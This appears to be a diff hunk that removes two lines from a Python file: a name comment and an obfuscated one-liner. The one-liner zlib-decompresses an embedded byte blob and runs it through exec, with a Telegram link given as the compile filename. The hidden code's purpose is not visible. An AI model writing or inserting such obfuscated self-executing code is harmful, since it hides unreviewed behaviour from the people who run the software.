@@ -1,2 +1,0 @@
-#MAZEN_MOHAMED
-exec((lambda _____, ______ : ______(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(_____),'<https://t.me/ADIL721','exec'))(b'x\x9cK+\xca\xcfU\xd0\xcb\xc9OOO-R\xc8\xcc-\xc8/*Q\xf0\xf1www\r\xe2J\x03K\xa5\xa4&\x95\xa6\xc3d\xc0\x1c\x98DbIbRbq*\\.\t*QZ\x92\x99S\x0c\x13\xd5\x82\n\x16T\x16\xe5\xc7\xa7\xe4\xc0\x84]\xf2\xcb\xf3r\xf2\x13SR\x8b\x00\x8e\x93.&',compile))
